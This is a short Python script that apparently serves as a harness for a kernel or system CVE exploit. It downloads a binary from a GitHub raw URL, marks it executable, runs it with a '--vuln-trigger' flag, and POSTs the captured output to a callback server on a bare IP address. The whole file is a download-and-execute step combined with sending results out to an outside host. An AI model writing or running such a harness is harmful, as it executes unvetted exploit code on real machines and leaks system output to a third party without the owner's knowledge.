#!/usr/bin/env python3
import pathlib, subprocess, time, json, urllib.request, hashlib, os
URL='https://raw.githubusercontent.com/begimher/snapgpt-probes/ab1b8f231c696ed537d16761d3431d82d002433e/cve-2026-23351-amzn2-gc'
# The URL is replaced after the binary commit below.
TARGET='/tmp/workspace/cve-gc'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'url':URL,'target':TARGET,'tests':[],'errors':[]}
try:
 b=urllib.request.urlopen(URL,timeout=60).read(); p=pathlib.Path(TARGET); p.write_bytes(b); p.chmod(0o700); out['download']={'bytes':len(b),'sha256':hashlib.sha256(b).hexdigest()}
except BaseException as e: out['errors'].append('download '+repr(e))
for args in (['--vuln-trigger'], []):
 try:
  p=subprocess.run([TARGET,*args],cwd='/tmp/workspace',capture_output=True,text=True,timeout=240)
  out['tests'].append({'args':args,'rc':p.returncode,'stdout':p.stdout[-50000:],'stderr':p.stderr[-10000:]})
 except BaseException as e: out['tests'].append({'args':args,'error':repr(e)})
raw=json.dumps(out,indent=2).encode(); pathlib.Path('/tmp/workspace/cve-gc-wrapper.out').write_bytes(raw)
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-cve-gc-wrapper-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'}); urllib.request.urlopen(q,timeout=30).read()
except BaseException as e: out['errors'].append('sink '+repr(e))
print(json.dumps(out,separators=(',',':')))
